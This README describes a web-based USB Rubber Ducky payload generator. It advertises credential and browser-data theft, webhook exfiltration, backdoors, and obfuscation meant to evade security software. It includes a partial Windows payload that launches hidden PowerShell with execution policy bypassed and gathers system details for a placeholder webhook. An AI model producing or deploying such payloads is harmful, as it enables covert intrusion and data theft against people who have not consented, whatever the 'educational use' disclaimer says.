
# Duckey Arsenal 🦆

![Duckey Arsenal Banner](https://img.shields.io/badge/Duckey%20Arsenal-Ultimate%20Payload%20Generator-00ff88?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iY3VycmVudENvbG9yIj48cGF0aCBkPSJNOC41IDVBMS41IDEuNSAwIDAgMCA3IDYuNXYxMUExLjUgMS41IDAgMCAwIDguNSAxOWg3YTEuNSAxLjUgMCAwIDAgMS41LTEuNXYtMTFBMS41IDEuNSAwIDAgMCAxNS41IDVoLTd6Ii8+PC9zdmc+)

**The Ultimate Rubber Ducky Payload Generator Platform**

Created by **0x0806** | Educational Use Only

---

## 🚀 Features

### Multi-Platform Support
- **Windows** - PowerShell and CMD based payloads
- **macOS** - Terminal and system commands
- **Linux** - Bash and system utilities
- **Android** - Termux compatible scripts
- **Custom** - Build your own payload templates

### Payload Categories
- 🔍 **Information Gathering** - System info, credentials, hardware details
- 🌐 **Network Attacks** - WiFi grabber, network recon, DNS enumeration
- 📥 **Data Exfiltration** - Browser data, file grabber, document theft
- 🛡️ **Persistence** - Backdoors, scheduled tasks, registry modifications
- 😄 **Pranks** - Harmless fun, desktop changes, notifications
- 🔎 **Reconnaissance** - System enumeration, user discovery, service scanning

### Advanced Features
- **Payload Obfuscation** - Enhanced security through code obfuscation
- **Random Delays** - Anti-detection timing variations
- **Anti-Detection** - Evasion techniques and security software checks
- **Multi-Stage Payloads** - Complex, phased attack scenarios
- **Webhook Integration** - Discord, Slack, and custom webhook support
- **Payload History** - Save, load, and manage generated payloads

---

## 🛠️ Installation & Setup

### Quick Start
1. Clone or download this repository
2. Open `index.html` in your web browser
3. Start generating payloads immediately!

### For Development
```bash
# If using a local server (recommended)
python -m http.server 8000
# or
npx serve .
```

---

## 💻 Usage

### Basic Payload Generation
1. **Select Target OS** - Choose from Windows, macOS, Linux, Android, or Custom
2. **Pick Category** - Select the type of payload you want to generate
3. **Configure Settings** - Set webhook URL, delays, and attempt limits
4. **Enable Advanced Features** - Toggle obfuscation, anti-detection, etc.
5. **Generate** - Click the rocket button to create your payload
6. **Copy/Download** - Save or copy the generated payload

### Configuration Options

| Setting | Description | Default |
|---------|-------------|---------|
| Webhook URL | Discord/Slack webhook for data exfiltration | Required* |
| Delay (ms) | Base delay between commands | 500ms |
| Max Attempts | Maximum retry attempts for network operations | 3 |
| Stealth Mode | Detection avoidance level (Low/Medium/High) | Medium |

*Not required for prank payloads

### Advanced Features Explained

#### 🔀 Payload Obfuscation
- Replaces common strings with variables
- Adds obfuscation headers and comments
- Makes payloads harder to detect by basic analysis

#### ⏰ Random Delays
- Adds randomized delays between commands
- Mimics human typing patterns
- Reduces suspicion from monitoring tools

#### 👁️ Anti-Detection
- Includes security software checks
- Adds reconnaissance delays
- Implements evasion techniques

#### 🎯 Multi-Stage Payloads
- Creates complex, phased attack scenarios
- Stage 1: Initial reconnaissance
- Stage 2: Main payload execution
- Allows for more sophisticated operations

---

## 📋 Payload Examples

### Windows System Information
```ducky
REM ===================================
REM    DUCKEY ARSENAL - System Info Grabber
REM    Created by: 0x0806
REM    Target: Windows
REM ===================================

DELAY 500
GUI r
DELAY 100
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500

STRING $webhook = "YOUR_WEBHOOK_HERE"
ENTER
STRING $computerName = $env:COMPUTERNAME
ENTER
STRING $userName = $env:USERNAME
ENTER
# ... (payload continues)
```

### macOS Terminal Prank
```ducky
REM ===================================
REM    DUCKEY ARSENAL - macOS Fun Prank
REM    Created by: 0x0806
REM    Target: macOS
REM ===================================

DELAY 500
COMMAND SPACE
DELAY 300
STRING Terminal
ENTER
DELAY 1000

STRING say "You have been rubber ducked by Duckey Arsenal!"
ENTER
```

---

## 🎨 UI/UX Features

### Modern Design
- **Dark Theme** - Eye-friendly cybersecurity aesthetic
- **Neon Accents** - Green and blue gradient highlights
- **Responsive Layout** - Works on desktop, tablet, and mobile
- **Smooth Animations** - Engaging hover effects and transitions

### User Experience
- **Tab Navigation** - Easy OS switching
- **Visual Feedback** - Real-time notifications and status updates
- **Code Highlighting** - Syntax-friendly monospace display
- **One-Click Actions** - Copy, download, and save functionality

### Interactive Elements
- **Category Cards** - Visual payload type selection
- **Toggle Switches** - Modern advanced feature controls
- **Progress Indicators** - Loading states for payload generation
- **History Management** - Browse and reload previous payloads

---

## 🔧 Technical Details

### Technologies Used
- **HTML5** - Semantic markup and structure
- **CSS3** - Modern styling with flexbox/grid
- **Vanilla JavaScript** - No framework dependencies
- **Local Storage** - Payload history persistence
- **Font Awesome** - Icon library
- **Google Fonts** - Typography (Inter, JetBrains Mono)

### Browser Compatibility
- Chrome 80+
- Firefox 75+
- Safari 13+
- Edge 80+

### File Structure
```
duckey-arsenal/
├── index.html          # Main application HTML
├── style.css           # Styling and themes
├── script.js           # Core application logic
└── README.md           # This documentation
```

---

## ⚖️ Legal & Ethics

### Educational Purpose Only
This tool is created for educational and authorized testing purposes only. Users are responsible for:

- **Legal Compliance** - Following local and international laws
- **Authorized Testing** - Only using on systems you own or have permission to test
- **Ethical Usage** - Respecting privacy and data protection rights
- **Responsible Disclosure** - Reporting vulnerabilities through proper channels

### Disclaimer
The creator (0x0806) is not responsible for any misuse of this tool. Always obtain proper authorization before testing security systems.

---

## 🤝 Contributing

### How to Contribute
1. Fork the repository
2. Create a feature branch
3. Add new payload templates or features
4. Test thoroughly across different browsers
5. Submit a pull request

### Adding New Payloads
```javascript
// Add to payloadTemplates object in script.js
newCategory: (config) => `
REM Your new payload template
DELAY ${config.delay}
// Your payload commands here
`
```

### Feature Requests
- Open an issue describing the new feature
- Include use cases and technical requirements
- Provide mockups or examples if applicable

---

## 📞 Support & Contact

### Getting Help
- **Issues** - Report bugs or request features via GitHub issues
- **Documentation** - Check this README for detailed usage instructions
- **Community** - Join discussions in the repository

### Creator
- **Handle**: 0x0806
- **Focus**: Cybersecurity education and ethical hacking tools
- **Mission**: Making security testing accessible and educational

---

## 📈 Version History

### v1.0.0 (Current)
- ✅ Multi-platform payload generation
- ✅ 6 payload categories with 20+ templates
- ✅ Advanced obfuscation and evasion features
- ✅ Modern responsive UI/UX
- ✅ Payload history and management
- ✅ Webhook integration support

### Planned Features
- 🔄 Payload encryption and encoding
- 🔄 Custom payload template editor
- 🔄 Batch payload generation
- 🔄 Export to multiple formats
- 🔄 Community payload library

---

## 🏆 Acknowledgments

- **Hak5** - For creating the USB Rubber Ducky
- **Security Community** - For inspiration and testing feedback
- **Open Source** - Built with love for the cybersecurity education community

---

<div align="center">

**Made with ❤️ by 0x0806**

*Remember: With great power comes great responsibility. Use wisely!*

[![License](https://img.shields.io/badge/License-Educational%20Use%20Only-red?style=flat-square)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active%20Development-green?style=flat-square)]()
[![Platform](https://img.shields.io/badge/Platform-Web%20Based-blue?style=flat-square)]()

</div>
